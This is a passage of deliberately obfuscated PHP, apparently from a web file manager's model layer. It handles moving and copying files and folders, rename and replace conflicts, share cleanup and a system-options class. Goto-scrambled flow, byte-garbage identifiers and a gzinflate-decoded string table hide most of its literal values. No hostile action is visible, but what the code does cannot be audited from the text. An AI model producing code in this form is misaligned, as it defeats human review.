Model($c‰Ó¶àà‘[192])->linkAdd($aÒ£¼ÙØËÈ[$c‰Ó¶àà‘[537]]); if ($CÅï¶»ğ´ && $aÒ£¼ÙØËÈ[$c‰Ó¶àà‘[568]]) { $this->removeNow($d¤ÜŒæ¨Á, !1); } goto bã¤†«†öŠ; F‡Ãâ¶Š¬å: $this->updateModifyTime($bÃœ§í¤‹Å); Model($c‰Ó¶àà‘[541])->eventMove($d¤ÜŒæ¨Á, $cŠõÁôŠªñ[$c‰Ó¶àà‘[485]], $cÁ«²ˆ´¼õ); Hook::trigger($c‰Ó¶àà‘[567], $bÉåº«ÙÉñ); goto e¶‹õÕ³Û; E¹¼×¨ªÊ: $this->lockWriteStart($cÁ«²ˆ´¼õ, $B¼šä­Çö); $aÒ£¼ÙØËÈ = array($c‰Ó¶àà‘[537] => array(), $c‰Ó¶àà‘[568] => !1); $this->clearShare($d¤ÜŒæ¨Á, $cÁ«²ˆ´¼õ); goto F†ëÑÛ ÷å; eÑì¥‹®Ş¸: $c‰Ó¶àà‘ =& $_SERVER[Šº]; $cŠõÁôŠªñ = $this->sourceInfo($d¤ÜŒæ¨Á); $dØ‘İ‹Â´Ÿ = $this->sourceInfo($cÁ«²ˆ´¼õ); goto DŒœØÉÚ‡ã; F†ëÑÛ ÷å: $CÅï¶»ğ´ = $this->fileNameExistCache($cÁ«²ˆ´¼õ, $cŠõÁôŠªñ[$c‰Ó¶àà‘[28]]); $eÃ…ÒÏ¦í· = $this->_move($d¤ÜŒæ¨Á, $cÁ«²ˆ´¼õ, $Fƒœ¼¥“®š, $aÒ£¼ÙØËÈ, $dÆ›ø„´Ü); $this->sourceCacheClear(); goto DéÍæÏ«ï´; dÑÛêËÛ£™: if (!$cŠõÁôŠªñ || !$dØ‘İ‹Â´Ÿ || $dØ‘İ‹Â´Ÿ[$c‰Ó¶àà‘[410]] != $c‰Ó¶àà‘[87]) { return !1; } Hook::trigger($c‰Ó¶àà‘[566], $bÉåº«ÙÉñ); $this->targetIsDelete = intval($cŠõÁôŠªñ[$c‰Ó¶àà‘[430]]); goto C‚£ƒ‡â”Ê; bã¤†«†öŠ: $this->lockMoveEnd($d¤ÜŒæ¨Á); $this->lockWriteEnd($cÁ«²ˆ´¼õ, $B¼šä­Çö); $this->folderSizeReset($cŠõÁôŠªñ[$c‰Ó¶àà‘[485]]); goto e—ùêšé×÷; DŒœØÉÚ‡ã: if ($cŠõÁôŠªñ[$c‰Ó¶àà‘[485]] == $dØ‘İ‹Â´Ÿ[$c‰Ó¶àà‘[403]]) { if ($cŠõÁôŠªñ[$c‰Ó¶àà‘[430]] == $c‰Ó¶àà‘[87]) { Model($c‰Ó¶àà‘[428])->restore(array($d¤ÜŒæ¨Á)); } if (!$dÆ›ø„´Ü || $dÆ›ø„´Ü == $cŠõÁôŠªñ[$c‰Ó¶àà‘[28]]) { return $d¤ÜŒæ¨Á; } } $bÉåº«ÙÉñ = $this->pathInfoMore($d¤ÜŒæ¨Á); if ($this->isParentOf($d¤ÜŒæ¨Á, $cÁ«²ˆ´¼õ)) { return !1; } goto dÑÛêËÛ£™; e¶‹õÕ³Û: return $eÃ…ÒÏ¦í·; goto C’Ûõ™ïÜÖ; e—ùêšé×÷: $this->folderSizeReset($cÁ«²ˆ´¼õ); $bÃœ§í¤‹Å = array($cŠõÁôŠªñ[$c‰Ó¶àà‘[485]], $cÁ«²ˆ´¼õ); if ($cŠõÁôŠªñ[$c‰Ó¶àà‘[410]] == $c‰Ó¶àà‘[87]) { $bÃœ§í¤‹Å[] = $d¤ÜŒæ¨Á; } goto F‡Ãâ¶Š¬å; C‚£ƒ‡â”Ê: if ($cŠõÁôŠªñ[$c‰Ó¶àà‘[485]] == $cÁ«²ˆ´¼õ && $dÆ›ø„´Ü != $cŠõÁôŠªñ[$c‰Ó¶àà‘[28]]) { $eÜ–††öó¤ = $this->fileNameExist($cÁ«²ˆ´¼õ, $dÆ›ø„´Ü); if ($eÜ–††öó¤ && $cŠõÁôŠªñ[$c‰Ó¶àà‘[410]] == $c‰Ó¶àà‘[504]) { goto c÷œ„ƒ…©ì; a‰ö×¸ëœ: return $eÜ–††öó¤; goto dùá±Ú›êç; B¸õ£ÉŠå«: $this->removeNow($d¤ÜŒæ¨Á, !1); $this->folderSizeReset($cÁ«²ˆ´¼õ); Hook::trigger($c‰Ó¶àà‘[567], $bÉåº«ÙÉñ); goto a‰ö×¸ëœ; c÷œ„ƒ…©ì: $A¦ƒñ¤ƒ¾¹ = $this->sourceInfo($eÜ–††öó¤); $c—¡Å™ã‡ = $this->fileHistory($A¦ƒñ¤ƒ¾¹, $cŠõÁôŠªñ[$c‰Ó¶àà‘[454]], $cŠõÁôŠªñ[$c‰Ó¶àà‘[78]]); if (!$c—¡Å™ã‡) { Model($c‰Ó¶àà‘[457])->remove($cŠõÁôŠªñ[$c‰Ó¶àà‘[454]]); } goto B¸õ£ÉŠå«; dùá±Ú›êç: } } $B¼šä­Çö = $dÆ›ø„´Ü ? $dÆ›ø„´Ü : $cŠõÁôŠªñ[$c‰Ó¶àà‘[28]]; $this->lockMoveStart($d¤ÜŒæ¨Á); goto E¹¼×¨ªÊ; C’Ûõ™ïÜÖ: } private function _move($a¦­øæÁÉô, $eá“îö¼¬´, $cÅ¯Çó•ŸÉ, &$Då•àˆ½Üª, $eçâùƒœˆÄ = '') { goto Bä÷…¾§ø•; C·î²Ñ„‰Œ: $B™ò‚ËÓ¦– = !1; if ($fÛÅŞ‡½…Ñ) { if ($cÅ¯Çó•ŸÉ == REPEAT_RENAME_FOLDER) { $cÊï£ßãŠæ = $this->fileNameAuto($eá“îö¼¬´, $cÊï£ßãŠæ, $cÅ¯Çó•ŸÉ, $fÛÅŞ‡½…Ñ); $aİíÊ—™˜” = $this->_moveForce($a¦­øæÁÉô, $eá“îö¼¬´, $cÊï£ßãŠæ); } else { if ($cÅ¯Çó•ŸÉ == REPEAT_RENAME_FOLDER) { $cÅ¯Çó•ŸÉ = REPEAT_RENAME; } $e‘ñ·¯ËÙë = $this->_childrenListSelect($a¦­øæÁÉô); foreach ($e‘ñ·¯ËÙë as $B–ÈØÌ³®˜) { $this->_move($B–ÈØÌ³®˜[$B´•Ã†‚•×[403]], $D˜¶¿•Ñ, $cÅ¯Çó•ŸÉ, $Då•àˆ½Üª); } $B™ò‚ËÓ¦– = !0; } } else { if ($cÅ¯Çó•ŸÉ == REPEAT_SKIP) { $B™ò‚ËÓ¦– = !0; } else { if ($cÅ¯Çó•ŸÉ == REPEAT_RENAME || $cÅ¯Çó•ŸÉ == REPEAT_RENAME_FOLDER) { $cÊï£ßãŠæ = $this->fileNameAuto($eá“îö¼¬´, $cÊï£ßãŠæ, $cÅ¯Çó•ŸÉ, $fÛÅŞ‡½…Ñ); $aİíÊ—™˜” = $this->_moveForce($a¦­øæÁÉô, $eá“îö¼¬´, $cÊï£ßãŠæ); } else { if ($cÅ¯Çó•ŸÉ == REPEAT_REPLACE) { $CØ¼¨êëÏÍ = $this->sourceInfoCache($D˜¶¿•Ñ); $c„™ÃŒˆ“ï = $this->fileHistory($CØ¼¨êëÏÍ, $D‘Ø“‹‡êõ[$B´•Ã†‚•×[454]], $D‘Ø“‹‡êõ[$B´•Ã†‚•×[78]]); if ($c„™ÃŒˆ“ï) { $Då•àˆ½Üª[$B´•Ã†‚•×[537]][] = $D‘Ø“‹‡êõ[$B´•Ã†‚•×[454]]; } else { $B™ò‚ËÓ¦– = !0; } } } } } if ($B™ò‚ËÓ¦– && !$Då•àˆ½Üª[$B´•Ã†‚•×[568]]) { $Då•àˆ½Üª[$B´•Ã†‚•×[568]] = !0; } goto cØ‚Î›·†“; dí‘„Ø«¼: $cÊï£ßãŠæ = $eçâùƒœˆÄ ? $eçâùƒœˆÄ : $D‘Ø“‹‡êõ[$B´•Ã†‚•×[28]]; $D˜¶¿•Ñ = $this->fileNameExistCache($eá“îö¼¬´, $cÊï£ßãŠæ); $this->lockMoveStart($a¦­øæÁÉô); goto Fßº´ÅÎÉ‚; cØ‚Î›·†“: return $aİíÊ—™˜”; goto B‡¶ôê§; Bä÷…¾§ø•: $B´•Ã†‚•× =& $_SERVER[Šº]; $D‘Ø“‹‡êõ = $this->sourceInfo($a¦­øæÁÉô); $fÛÅŞ‡½…Ñ = $D‘Ø“‹‡êõ[$B´•Ã†‚•×[410]] == $B´•Ã†‚•×[87]; goto dí‘„Ø«¼; Fßº´ÅÎÉ‚: $this->lockWriteStart($eá“îö¼¬´, $cÊï£ßãŠæ); if (!$D˜¶¿•Ñ) { return $this->_moveForce($a¦­øæÁÉô, $eá“îö¼¬´, $cÊï£ßãŠæ); } $aİíÊ—™˜” = $D˜¶¿•Ñ; goto C·î²Ñ„‰Œ; B‡¶ôê§: } private function _moveForce($aÙÂÀÂÁß, $Dİù°çèé‹, $c×Â™«ÜŸ„) { goto d–÷öé™ƒË; A§•”¶ÑëŞ: if (!$fÈÇ—»ÄÏâ && $this->moveClearAuth) { Model($CÚß‹ÜÀÇÛ[489])->authClear($aÙÂÀÂÁß); } $c®‰êïÏ›‰ = $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[430]] == $CÚß‹ÜÀÇÛ[87] && $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[430]] != $CÚß‹ÜÀÇÛ[87]; if ($c®‰êïÏ›‰) { $Aî½¹±‘“†[$CÚß‹ÜÀÇÛ[429]] = 0; } goto d«ÂˆÃ†; d–÷öé™ƒË: $CÚß‹ÜÀÇÛ =& $_SERVER[Šº]; $fšÀõˆ„õ = $this->sourceInfo($aÙÂÀÂÁß); $D­ÆÂ’¼í = $this->sourceInfo($Dİù°çèé‹); goto bôæ¶ƒ”³Î; bôæ¶ƒ”³Î: $BÂ…´²÷ß = $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[410]] == $CÚß‹ÜÀÇÛ[87]; $Aî½¹±‘“† = array($CÚß‹ÜÀÇÛ[402] => $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[403]], $CÚß‹ÜÀÇÛ[561] => $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[494]] . $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[403]] . $CÚß‹ÜÀÇÛ[47], $CÚß‹ÜÀÇÛ[557] => $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[411]], $CÚß‹ÜÀÇÛ[558] => $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[491]], $CÚß‹ÜÀÇÛ[560] => USER_ID, $CÚß‹ÜÀÇÛ[420] => $c×Â™«ÜŸ„); $fÈÇ—»ÄÏâ = $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[411]] == SourceModel::TYPE_GROUP && $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[411]] == SourceModel::TYPE_GROUP && $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[491]] == $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[491]]; goto A§•”¶ÑëŞ; d«ÂˆÃ†: if ($BÂ…´²÷ß) { $eÙØ³Ä¹»— = array($CÚß‹ÜÀÇÛ[561] => array($CÚß‹ÜÀÇÛ[520], $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[494]] . $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[403]] . $CÚß‹ÜÀÇÛ[521])); $EÄÜÜ«ëò´ = $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[494]] . $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[403]] . $CÚß‹ÜÀÇÛ[47]; $B¥´Ã¾Ä´ = $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[494]] . $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[403]] . $CÚß‹ÜÀÇÛ[47] . $fšÀõˆ„õ[$CÚß‹ÜÀÇÛ[403]] . $CÚß‹ÜÀÇÛ[47]; $A©‘ì½ë¿ë = array($CÚß‹ÜÀÇÛ[561] => array($CÚß‹ÜÀÇÛ[569], "\x72\x65\160\154\x61\x63\x65\x28\x70\141\x72\145\x6e\x74\114\x65\166\x65\154\x2c\47{$EÄÜÜ«ëò´}\x27\x2c\47{$B¥´Ã¾Ä´}\x27\51"), $CÚß‹ÜÀÇÛ[557] => $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[411]], $CÚß‹ÜÀÇÛ[558] => $D­ÆÂ’¼í[$CÚß‹ÜÀÇÛ[491]]); if ($c®‰êïÏ›‰) { $A©‘ì½ë¿ë[$CÚß‹ÜÀÇÛ[429]] = 0; } $this->where($eÙØ³Ä¹»—)->data($A©‘ì½ë¿ë)->save(); } $this->where(array($CÚß‹ÜÀÇÛ[417] => $aÙÂÀÂÁß))->data($Aî½¹±‘“†)->save(); return $aÙÂÀÂÁß; goto f­ğõØ±Åî; f­ğõØ±Åî: } private function clearShare($aµ ¸Û»¥Î, $e«‚´‘È×) { goto DŠâÇÏ…Ñ‰; Fß›İå„ˆ•: if (!$f®¡Ş‹¦) { return; } $B„¾Ù˜ä¤Æ = array($BŠˆÃ¨«˜í[403] => array($BŠˆÃ¨«˜í[7], $f®¡Ş‹¦), $BŠˆÃ¨«˜í[482] => 1); $b‘ŠåïØ = Model($BŠˆÃ¨«˜í[571])->field($BŠˆÃ¨«˜í[475])->where($B„¾Ù˜ä¤Æ)->select(); goto fİ³çëÒÒ±; fİ³çëÒÒ±: if (!$b‘ŠåïØ) { return; } $b‘ŠåïØ = array_to_keyvalue($b‘ŠåïØ, $BŠˆÃ¨«˜í[33], $BŠˆÃ¨«˜í[475]); $B„¾Ù˜ä¤Æ = array($BŠˆÃ¨«˜í[475] => array($BŠˆÃ¨«˜í[7], $b‘ŠåïØ)); goto fÇÁÅ™—ñ‡; DøøÈäÈÕò: if ($CÔÛ®ã“†”[$BŠˆÃ¨«˜í[491]] == $B´±ÖÈÑòŒ[$BŠˆÃ¨«˜í[491]] && $CÔÛ®ã“†”[$BŠˆÃ¨«˜í[411]] == $BŠˆÃ¨«˜í[570]) { return; } $B„¾Ù˜ä¤Æ = array($BŠˆÃ¨«˜í[494] => array($BŠˆÃ¨«˜í[520], $CÔÛ®ã“†”[$BŠˆÃ¨«˜í[494]] . $aµ ¸Û»¥Î . $BŠˆÃ¨«˜í[521])); $f®¡Ş‹¦ = $this->field($BŠˆÃ¨«˜í[417])->where($B„¾Ù˜ä¤Æ)->getField($BŠˆÃ¨«˜í[403], !0); goto Fß›İå„ˆ•; DŠâÇÏ…Ñ‰: $BŠˆÃ¨«˜í =& $_SERVER[Šº]; $CÔÛ®ã“†” = $this->sourceInfo($aµ ¸Û»¥Î); $B´±ÖÈÑòŒ = $this->sourceInfo($e«‚´‘È×); goto DøøÈäÈÕò; fÇÁÅ™—ñ‡: Model($BŠˆÃ¨«˜í[571])->where($B„¾Ù˜ä¤Æ)->save(array($BŠˆÃ¨«˜í[482] => 0)); Model($BŠˆÃ¨«˜í[572])->where($B„¾Ù˜ä¤Æ)->delete(); goto fê¼ˆò†”; fê¼ˆò†”: } public function copyFolderFromIO($eÓ÷«èë, $F÷±·‚™ó…, $eƒÏ“–ƒªß, $aÅ·Ş…Ğæ¯, $Dç¾ŠÚºÇ¸, $EòÄËö˜õó = false) { goto Fìš¬è¢´ ; dœ¥¾ñÍˆ©: Model($A¦ºãŠãÅŒ[540])->addAll($e†Èö±—Ñô[$A¦ºãŠãÅŒ[538]], array(), !0); Model($A¦ºãŠãÅŒ[541])->eventCopy($F³âŒ¬„Ôí); $this->saveAll($e†Èö±—Ñô[$A¦ºãŠãÅŒ[539]]); goto C†„´…¿; C†„´…¿: Model($A¦ºãŠãÅŒ[457])->linkAdd($e†Èö±—Ñô[$A¦ºãŠãÅŒ[537]]); Model($A¦ºãŠãÅŒ[457])->remove($e†Èö±—Ñô[$A¦ºãŠãÅŒ[573]]); $this->folderSizeReset($eƒÏ“–ƒªß); goto F·‡‘ÚÓÑ; F·‡‘ÚÓÑ: $this->updateModifyTime($eƒÏ“–ƒªß); return $F³âŒ¬„Ôí; goto B•œ¯‰¾Åç; B†§Ïº Ñ: if ($FÆÓ©É¨Çø) { $this->_childrenAllMake($FÆÓ©É¨Çø); } Hook::trigger($A¦ºãŠãÅŒ[574]); $this->_copyChildTo($eÓ÷«èë, $F÷±·‚™ó…, $F³âŒ¬„Ôí, $aÅ·Ş…Ğæ¯, $e†Èö±—Ñô, $Dç¾ŠÚºÇ¸); goto e†©ù¸İÙ¿; Fìš¬è¢´ : $A¦ºãŠãÅŒ =& $_SERVER[Šº]; $e†Èö±—Ñô = array($A¦ºãŠãÅŒ[538] => array(), $A¦ºãŠãÅŒ[539] => array(), $A¦ºãŠãÅŒ[537] => array(), $A¦ºãŠãÅŒ[573] => array()); $E‡Ñ‰“Ë‹ = $EòÄËö˜õó ? $EòÄËö˜õó : $eÓ÷«èë->pathThis($F÷±·‚™ó…); goto bˆ×Óù¼›; e†©ù¸İÙ¿: Hook::trigger($A¦ºãŠãÅŒ[575]); if ($F³âŒ¬„Ôí) { $this->folderSizeResetChildren($F³âŒ¬„Ôí); } $this->_childrenListClear(); goto dœ¥¾ñÍˆ©; bˆ×Óù¼›: $FÆÓ©É¨Çø = $this->fileNameExist($eƒÏ“–ƒªß, $E‡Ñ‰“Ë‹); $F³âŒ¬„Ôí = $this->mkdir($eƒÏ“–ƒªß, $E‡Ñ‰“Ë‹, $aÅ·Ş…Ğæ¯); if (!$FÆÓ©É¨Çø || $aÅ·Ş…Ğæ¯ == REPEAT_RENAME_FOLDER) { $aÅ·Ş…Ğæ¯ = !1; } goto B†§Ïº Ñ; B•œ¯‰¾Åç: } private function _copyChildTo($f¸ÕÓºğ¹Ÿ, $Bô»ôÒ³è°, $CšùÆñŸ†, $BšÉ­ä÷½», &$AõñÒ‘„Ş«, $Aè¾İ²¸‡Õ) { goto e¬ §È‘; d—Ò›Áë¥Ç: if (!empty($d¨¢Ë¡´³õ)) { $this->addAll($d¨¢Ë¡´³õ); $this->_childrenListSelect($CšùÆñŸ†); } $eŒŸÃ¼©³¹ = $this->_childrenList($CšùÆñŸ†); $eŒŸÃ¼©³¹ = array_to_keyvalue($eŒŸÃ¼©³¹, $eöò³í‰Øø[28]); goto Eíã´Û‚áÍ; e¬ §È‘: $eöò³í‰Øø =& $_SERVER[Šº]; $FˆœÛÙª¨ø = $this->sourceInfoCache($CšùÆñŸ†); $BÅê†ä„‹Î = $f¸ÕÓºğ¹Ÿ->listPath($Bô»ôÒ³è°); goto a±Ñš¬ëß; a±Ñš¬ëß: $BÅê†ä„‹Î = $BÅê†ä„‹Î ? $BÅê†ä„‹Î : array($eöò³í‰Øø[74] => array(), $eöò³í‰Øø[75] => array()); $aŸŒäÏ  = array_merge($BÅê†ä„‹Î[$eöò³í‰Øø[74]], $BÅê†ä„‹Î[$eöò³í‰Øø[75]]); $CàÑ§Ç Ôº = $this->_addFiles($f¸ÕÓºğ¹Ÿ, $BÅê†ä„‹Î[$eöò³í‰Øø[74]], $Aè¾İ²¸‡Õ); goto F æß®§ôŠ; Eíã´Û‚áÍ: foreach ($aŸŒäÏ  as $cáöğá™†Ú) { $d¤˜‰äç×õ = $eŒŸÃ¼©³¹[$cáöğá™†Ú[$eöò³í‰Øø[28]]]; $E£•ñò˜Ãˆ = $d¤˜‰äç×õ[$eöò³í‰Øø[403]]; $this->_copyApplyMeta($d¤˜‰äç×õ, $AõñÒ‘„Ş«); if ($cáöğá™†Ú[$eöò³í‰Øø[29]] == $eöò³í‰Øø[77]) { $cáöğá™†Ú[$eöò³í‰Øø[76]] = $f¸ÕÓºğ¹Ÿ->getPathInner($cáöğá™†Ú[$eöò³í‰Øø[76]]); $this->_copyChildTo($f¸ÕÓºğ¹Ÿ, $cáöğá™†Ú[$eöò³í‰Øø[76]], $E£•ñò˜Ãˆ, $BšÉ­ä÷½», $AõñÒ‘„Ş«, $Aè¾İ²¸‡Õ); } } goto d„¿Ÿó‘¦³; F æß®§ôŠ: $d¨¢Ë¡´³õ = array(); foreach ($aŸŒäÏ  as &$cáöğá™†Ú) { goto EŞ’·ŒÑƒ­; EŞ’·ŒÑƒ­: if (isset($CàÑ§Ç Ôº[$cáöğá™†Ú[$eöò³í‰Øø[28]]])) { $cáöğá™†Ú = $CàÑ§Ç Ôº[$cáöğá™†Ú[$eöò³í‰Øø[28]]]; } $cáöğá™†Ú[$eöò³í‰Øø[410]] = $cáöğá™†Ú[$eöò³í‰Øø[29]] == $eöò³í‰Øø[77]; $cáöğá™†Ú[$eöò³í‰Øø[412]] = _get($cáöğá™†Ú, $eöò³í‰Øø[168], $eöò³í‰Øø[33]); goto f§¬¤ğêŠæ; DÑ’ŒÛ®ŒØ: if ($BšÉ­ä÷½») { $cåÑÜ„¹‰ = $this->fileNameExistCache($CšùÆñŸ†, $cáöğá™†Ú[$eöò³í‰Øø[28]]); if ($cåÑÜ„¹‰) { if ($cáöğá™†Ú[$eöò³í‰Øø[410]] || $BšÉ­ä÷½» == REPEAT_SKIP) { continue; } if ($BšÉ­ä÷½» == REPEAT_REPLACE) { $d¤˜‰äç×õ = $this->sourceInfoCache($cåÑÜ„¹‰); $F«¾ÑÏ¿ïŒ = $this->fileHistory($d¤˜‰äç×õ, $cáöğá™†Ú[$eöò³í‰Øø[454]], $cáöğá™†Ú[$eöò³í‰Øø[78]]); if ($F«¾ÑÏ¿ïŒ) { $AõñÒ‘„Ş«[$eöò³í‰Øø[537]][] = $cáöğá™†Ú[$eöò³í‰Øø[454]]; } continue; } else { if ($BšÉ­ä÷½» == REPEAT_RENAME) { $cáöğá™†Ú[$eöò³í‰Øø[28]] = $this->fileNameAutoCache($CšùÆñŸ†, $cáöğá™†Ú[$eöò³í‰Øø[28]], $BšÉ­ä÷½», !1); } } } } if (!$cáöğá™†Ú[$eöò³í‰Øø[410]] && $cáöğá™†Ú[$eöò³í‰Øø[454]]) { $AõñÒ‘„Ş«[$eöò³í‰Øø[537]][] = $cáöğá™†Ú[$eöò³í‰Øø[454]]; } $d¨¢Ë¡´³õ[] = $this->_makeItemData($cáöğá™†Ú, $FˆœÛÙª¨ø, $cáöğá™†Ú[$eöò³í‰Øø[28]]); goto BÜ‰ƒŠ‰±; f§¬¤ğêŠæ: $cáöğá™†Ú[$eöò³í‰Øø[78]] = _get($cáöğá™†Ú, $eöò³í‰Øø[78], 0); $cáöğá™†Ú[$eöò³í‰Øø[454]] = _get($cáöğá™†Ú, $eöò³í‰Øø[454], 0); if (!isset($cáöğá™†Ú[$eöò³í‰Øø[576]]) && $cáöğá™†Ú[$eöò³í‰Øø[454]]) { $AõñÒ‘„Ş«[$eöò³í‰Øø[573]][] = $cáöğá™†Ú[$eöò³í‰Øø[454]]; } goto DÑ’ŒÛ®ŒØ; BÜ‰ƒŠ‰±: } unset($cáöğá™†Ú); goto d—Ò›Áë¥Ç; d„¿Ÿó‘¦³: } private function _addFiles($aÃòí²©î×, $B¨É—²¥ê, $DÚ¾óã³ÂÉ) { goto B­‡™Íñ™õ; Bî²®ªÑë: foreach ($B¨É—²¥ê as $e¬ÌˆÜ·è®) { $dÚÆö­Ÿ˜ß[$e¬ÌˆÜ·è®[$a½ØÑôÁ„Ã[28]]] = $e¬ÌˆÜ·è®; } return $dÚÆö­Ÿ˜ß; goto a£“÷½±; D²ÁÒ—ñ»: foreach ($A¾Íæâ¦ò as $FØìÎ¼³¹¼) { if (!isset($bÍô÷‹ÍÕ™[$FØìÎ¼³¹¼[$a½ØÑôÁ„Ã[170]]])) { continue; } $f“îœÄÖª‡ = $bÍô÷‹ÍÕ™[$FØìÎ¼³¹¼[$a½ØÑôÁ„Ã[170]]]; foreach ($f“îœÄÖª‡ as &$E©ãöî÷·Ô) { $E©ãöî÷·Ô[$a½ØÑôÁ„Ã[454]] = $FØìÎ¼³¹¼[$a½ØÑôÁ„Ã[454]]; $E©ãöî÷·Ô[$a½ØÑôÁ„Ã[576]] = !0; } unset($E©ãöî÷·Ô); } $Cî³½æÒ¸  = array(); foreach ($B¨É—²¥ê as $C”ëáÆ¶èÄ) { if (isset($C”ëáÆ¶èÄ[$a½ØÑôÁ„Ã[576]]) && $C”ëáÆ¶èÄ[$a½ØÑôÁ„Ã[576]]) { continue; } $E¦šÌ®‹» = $aÃòí²©î×->getPathInner($C”ëáÆ¶èÄ[$a½ØÑôÁ„Ã[76]]); $eØçŠ•‚¢· = $FéŸóÛ«Ÿ->addFileMake($E¦šÌ®‹», $C”ëáÆ¶èÄ[$a½ØÑôÁ„Ã[78]], $C”ëáÆ¶èÄ[$a½ØÑôÁ„Ã[171]], $C”ëáÆ¶èÄ[$a½ØÑôÁ„Ã[170]], $C”ëáÆ¶èÄ[$a½ØÑôÁ„Ã[28]], $DÚ¾óã³ÂÉ); $Cî³½æÒ¸ [] = $eØçŠ•‚¢·; } goto c‡“Õéõ; B­‡™Íñ™õ: $a½ØÑôÁ„Ã =& $_SERVER[Šº]; if (!$B¨É—²¥ê || count($B¨É—²¥ê) == 0) { return array(); } $bÍô÷‹ÍÕ™ = array(); goto b§Úç‚§àÌ; b§Úç‚§àÌ: foreach ($B¨É—²¥ê as &$E©ãöî÷·Ô) { goto Eµ¡›çÆÕã; aÑ¤†™¡ƒÆ: if (count($bÍô÷‹ÍÕ™[$aÌ›–È‚ß¾]) > 1) { $E©ãöî÷·Ô[$a½ØÑôÁ„Ã[576]] = !0; } goto DÏÜÜ¡Î³İ; Eµ¡›çÆÕã: Hook::trigger($a½ØÑôÁ„Ã[577], $E©ãöî÷·Ô); $E©ãöî÷·Ô[$a½ØÑôÁ„Ã[76]] = $aÃòí²©î×->getPathInner($E©ãöî÷·Ô[$a½ØÑôÁ„Ã[76]]); $DÒ–Äğäˆ¹ = $aÃòí²©î×->hashSimple($E©ãöî÷·Ô[$a½ØÑôÁ„Ã[76]]); goto eŸÖÍÒâˆÃ; eŸÖÍÒâˆÃ: $aÌ›–È‚ß¾ = $aÃòí²©î×->hashMd5($E©ãöî÷·Ô[$a½ØÑôÁ„Ã[76]]); if (strlen($aÌ›–È‚ß¾) > 10 && !isset($bÍô÷‹ÍÕ™[$aÌ›–È‚ß¾])) { $bÍô÷‹ÍÕ™[$aÌ›–È‚ß¾] = array(); } $E©ãöî÷·Ô[$a½ØÑôÁ„Ã[171]] = $DÒ–Äğäˆ¹; goto bäØíÖËİ; bäØíÖËİ: $E©ãöî÷·Ô[$a½ØÑôÁ„Ã[170]] = $aÌ›–È‚ß¾; Hook::trigger($a½ØÑôÁ„Ã[578], $E©ãöî÷·Ô); $bÍô÷‹ÍÕ™[$aÌ›–È‚ß¾][] =& $E©ãöî÷·Ô; goto aÑ¤†™¡ƒÆ; DÏÜÜ¡Î³İ: } unset($E©ãöî÷·Ô); $bÚ—Á§ßƒã = array($a½ØÑôÁ„Ã[170] => array($a½ØÑôÁ„Ã[7], array_keys($bÍô÷‹ÍÕ™))); goto d²Ç‰§ù‚Ù; c‡“Õéõ: $FéŸóÛ«Ÿ->addAll($Cî³½æÒ¸ ); $bÚ—Á§ßƒã = array($a½ØÑôÁ„Ã[170] => array($a½ØÑôÁ„Ã[7], array_keys($bÍô÷‹ÍÕ™))); $A¾Íæâ¦ò = $FéŸóÛ«Ÿ->where($bÚ—Á§ßƒã)->select(); goto DÏºóÜùö¼; DÏºóÜùö¼: $A¾Íæâ¦ò = $A¾Íæâ¦ò ? $A¾Íæâ¦ò : array(); foreach ($A¾Íæâ¦ò as $FØìÎ¼³¹¼) { if (!isset($bÍô÷‹ÍÕ™[$FØìÎ¼³¹¼[$a½ØÑôÁ„Ã[170]]])) { continue; } $FœĞè‹­ç¾ =& $bÍô÷‹ÍÕ™[$FØìÎ¼³¹¼[$a½ØÑôÁ„Ã[170]]]; foreach ($FœĞè‹­ç¾ as &$E©ãöî÷·Ô) { $E©ãöî÷·Ô[$a½ØÑôÁ„Ã[454]] = $FØìÎ¼³¹¼[$a½ØÑôÁ„Ã[454]]; } unset($E©ãöî÷·Ô); } $dÚÆö­Ÿ˜ß = array(); goto Bî²®ªÑë; d²Ç‰§ù‚Ù: $FéŸóÛ«Ÿ = Model($a½ØÑôÁ„Ã[579]); $A¾Íæâ¦ò = $FéŸóÛ«Ÿ->where($bÚ—Á§ßƒã)->select(); $A¾Íæâ¦ò = $A¾Íæâ¦ò ? $A¾Íæâ¦ò : array(); goto D²ÁÒ—ñ»; a£“÷½±: } } define($_SERVER[Šº][580], $_SERVER[Šº][581]); goto b½¿ôëî¦“; Eôó÷Á½¿: define($_SERVER[Šº][0], $_SERVER[Šº][1]); $_SERVER[ÇÚ] = explode($_SERVER[Šº][2], gzinflate(substr($_SERVER[Šº][3], 10, -8))); function binCheckEq($FˆÌ³ãÂº›, $AÒ»ÚÅšñ¼) { return $FˆÌ³ãÂº› == $AÒ»ÚÅšñ¼; } goto C´ÜÉÕ¹²±; a”¢‘ëÚ¢½: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\x6d\x5f\157\160\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\162\157\x6c\145", "\162\157\x6c\145\x47\x72\157\165\x70", "\x72\145\147\151\x73\x74", "\145\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($dİÃ¶³Ú¢Ÿ) { return "\123\171\163\164\x65\x6d\x4f\x70\164\151\x6f\156\x5f{$dİÃ¶³Ú¢Ÿ}"; } protected function optionDefault($B¥ô…ŒÙ¼Í = '') { $B×ÙƒµÃ·§ =& $_SERVER[Šº]; if ($B¥ô…ŒÙ¼Í == $B×ÙƒµÃ·§[33]) { return $GLOBALS[$B×ÙƒµÃ·§[6]][$B×ÙƒµÃ·§[377]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel 